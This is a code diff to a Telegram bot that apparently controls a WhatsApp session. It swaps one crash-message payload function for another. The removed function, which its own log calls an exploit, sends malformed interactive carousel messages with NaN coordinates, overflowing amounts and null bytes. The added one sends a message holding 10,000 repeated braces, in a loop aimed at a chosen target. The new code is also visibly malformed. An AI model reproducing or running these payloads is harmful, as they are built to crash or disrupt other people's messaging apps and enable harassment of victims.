@@ -1584,7 +1584,7 @@ bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
     try {
       while (Date.now() < endAt) {
         if (!isWhatsAppConnected) break;
-        await BapakLoe(sock, target);
+        await maklo(sock, target);
         await sleep(3000);
       }
     } catch (err) {
@@ -1868,243 +1868,57 @@ async function clearChat(target) {
 }
 
 //FANGSYEN
-async function BapakLoe(sock, target) {
-    console.log(`[🤪] SENDING SUKI EXPLOIT TO ${target}...`);  
-    try {
-        await sock.updateProfileName("\u200e");
-    } catch (e) {}
-    const emptyList = [];
-    const illegalCoord = NaN;
-    const negativeDuration = -999999999; 
-    const maxInt = 2147483647; 
-    const payloadList = JSON.stringify({
-        "title": "List",
-        "sections": [
-            {
-                "title": "Section",
-                "rows": [] 
-            }
-        ]
-    }); 
-    const payloadBooking = JSON.stringify({
-        "booking_time": negativeDuration, 
-        "latitude": illegalCoord,
-        "longitude": illegalCoord,
-        "title": "Book",
-        "participant_count": -1 
-    });   
-    const payloadOptOut = JSON.stringify({
-        "title": "OptOut",
-        "topics": null, 
-        "reason": null
-    });  
-    const payloadCall = JSON.stringify({
-        "call_type": "voice", 
-        "call_id": "invalid",
-        "participants": {} 
-    }); 
-    const payloadPayment = JSON.stringify({
-        "name": "payment_info",
-        "currency": "IDR",
-        "total_amount": {
-            "value": maxInt + maxInt, 
-            "offset": 100
+async function maklo(sock, target) {
+  const bapaklo =
+  generateWAMessageFromContent(target, {
+      extendedTextMessage: {
+        text: "bapak lowh jir",
+        matchedText: "t.me/fantzy_reals13",
+        description: " dnd ;) ",
+        title: " one only ",
+        paymentLinkMetadata: {
+          button: {
+            displayText: "polibet",
+          },
+          header: {
+            headerType: 1,
+          },
+          provider: {
+            paramsJson: "{".repeat(10000),
+          },
         },
-        "reference_id": "REF",
-        "type": "physical-goods",
-        "order": {
-            "status": "pending",
-            "subtotal": {
-                "value": -1, 
-                "offset": -1  
+        linkPreviewMetadata: {
+          paymentLinkMetadata: {
+            button: {
+              displayText: "happiness",
             },
-            "items": [
-                {
-                    "quantity": maxInt 
-                }
-            ]
-        }
-    });    
-    const payloadCatalog = JSON.stringify({
-        "title": "Catalog",
-        "products": [null, null, null] 
-    });    
-    const timestamp = Date.now();  
-    for (let i = 0; i < 1; i++) {
-        try {
-            const messageId = `3EB0${timestamp.toString(16).toUpperCase()}${Math.random().toString(36).substring(2, 10).toUpperCase()}`;            
-            const msg = generateWAMessageFromContent(target, {
-                viewOnceMessage: {
-                    message: {
-                        messageContextInfo: {
-                            deviceListMetadata: {},
-                            deviceListMetadataVersion: 2
-                        },
-                        interactiveMessage: {
-                            header: {
-                                title: "./comon.dex/java/",
-                                subtitle: "System",
-                                hasMediaAttachment: true,
-                                locationMessage: {
-                                    degreesLatitude: illegalCoord,
-                                    degreesLongitude: illegalCoord,
-                                    name: "\0",
-                                    address: "JAWA SELATAN"
-                                }
-                            },
-                            body: {
-                                text: "\0"
-                            },
-                            footer: {
-                                text: "\0"
-                            },
-                            carouselMessage: {
-                                cards: [
-                                    {
-                                        header: {
-                                            title: "Card 1",
-                                            hasMediaAttachment: false
-                                        },
-                                        body: {
-                                            text: "\0"
-                                        },
-                                        nativeFlowMessage: {
-                                            messageParamsJson: payloadPayment,
-                                            buttons: [
-                                                {
-                                                    name: "single_select",
-                                                    buttonParamsJson: payloadList
-                                                },
-                                                {
-                                                    name: "booking_confirmation", 
-                                                    buttonParamsJson: payloadBooking
-                                                }
-                                            ]
-                                        }
-                                    },
-                                    {
-                                        header: {
-                                            title: "Card 2",
-                                            hasMediaAttachment: false
-                                        },
-                                        body: {
-                                            text: "\0"
-                                        },
-                                        nativeFlowMessage: {
-                                            messageParamsJson: payloadPayment,
-                                            buttons: [
-                                                {
-                                                    name: "psi_opt_outs",
-                                                    buttonParamsJson: payloadOptOut
-                                                },
-                                                {
-                                                    name: "call_permission_request",
-                                                    buttonParamsJson: payloadCall
-                                                }
-                                            ]
-                                        }
-                                    },
-                                    {
-                                        header: {
-                                            title: "Card 3",
-                                            hasMediaAttachment: false
-                                        },
-                                        body: {
-                                            text: "\0"
-                                        },
-                                        nativeFlowMessage: {
-                                            messageParamsJson: payloadPayment,
-                                            buttons: [
-                                                {
-                                                    name: "catalog_message",
-                                                    buttonParamsJson: payloadCatalog
-                                                },
-                                                {
-                                                    name: "single_select",
-                                                    buttonParamsJson: payloadList
-                                                }
-                                            ]
-                                        }
-                                    }
-                                ],
-                                messageVersion: 1
-                            },
-                            contextInfo: {
-                                mentionedJid: [],
-                                groupMentions: [],
-                                isForwarded: true,
-                                forwardedNewsletterMessageInfo: {
-                                    newsletterJid: "120363360028149780@newsletter",
-                                    serverMessageId: 1,
-                                    newsletterName: "idk"
-                                },
-                                forwardingScore: 99,
-                                remoteJid: "status@broadcast",
-                                participant: "0@s.whatsapp.net",
-                                quotedMessage: {
-                                    audioMessage: {
-                                        url: "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525153031570742_2352761085_n.enc?ccb=11-4&oh=01_Q5AaIGTKSOt4p7yPnClLvCZxAJ5NXOKJNKIJJbGbXp2nrJfp&oe=676A2571&_nc_sid=5e03e0&mms3=true",
-                                        mimetype: "audio/mpeg",
-                                        fileSha256: "ZikIJP35XhNs5KQX4Z1RbBLkWCo1F9J4RJbFdGgKcaI=",
-                                        fileLength: "999999",
-                                        seconds: negativeDuration, 
-                                        ptt: true,
-                                        mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
-                                        fileEncSha256: "sR9J9MNgBLTz7MAhP8umKPdWdZ4IWwJJdSJiPYMeHg8=",
-                                        directPath: "/v/t62.7114-24/56189035_1525153031570742_2352761085_n.enc?ccb=11-4&oh=01_Q5AaIGTKSOt4p7yPnClLvCZxAJ5NXOKJNKIJJbGbXp2nrJfp&oe=676A2571&_nc_sid=5e03e0",
-                                        mediaKeyTimestamp: "1735382602"
-                                    }
-                                },
-                                externalAdReply: {
-                                    title: "\u0000",
-                                    body: "none",
-                                    mediaType: 1,
-                                    thumbnailUrl: "https://mmg.whatsapp.net",
-                                    sourceUrl: "https://t.me/zihardev",
-                                    showAdAttribution: false,
-                                    renderLargerThumbnail: false
-                                },
-                                stanzaId: undefined,
-                                fromMe: false
-                            }
-                        }
-                    }
-                }
-            }, {
-                userJid: "0@s.whatsapp.net",
-                quoted: null
-            });
-            
-            msg.key = {
-                remoteJid: target,
-                fromMe: false,
-                id: messageId,
-                participant: undefined
-            };          
-            delete msg.pushName;
-            delete msg.verifiedBizName;       
-            msg.messageTimestamp = Math.floor(timestamp / 1000) + i;    
-            await sock.relayMessage(target, msg.message, {
-                messageId: msg.key.id,
-                participant: undefined,
-                useMessageComposer: false,
-                statusJidList: [],
-                additionalAttributes: {
-                    ephemeralExpiration: 86400
-                }
-            });
-
-            await new Promise(r => setTimeout(r, 1000));
-            
-        } catch (e) {
-            console.log(`[!] EROR SEND SUKI FIX SENDIRI KONTOL-${i}:`, e);
-        }
-    }
-    
-    console.log("SUKI DONE!");
+            header: {
+              headerType: 1,
+            },
+            provider: {
+              paramsJson: "{".repeat(10000),
+            },
+          },
+          urlMetadata: {
+            fbExperimentId: 999,
+          },
+          fbExperimentId: 888,
+          linkMediaDuration: 555,
+          socialMediaPostType: 1221,
+          videoContentUrl: "https://wa.me/settings/linked_devices#,,xrellyspec",
+          videoContentCaption: " Oh My Kisah ",
+        },
+      },
+    },
+    { participant: { jid: target }}, 
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+    Message: bapaklo.message, 
+      }}), 
+    {messageId: null}
+  )
 }
-
-
+}
 
 bot.launch({
     dropPendingUpdates: true
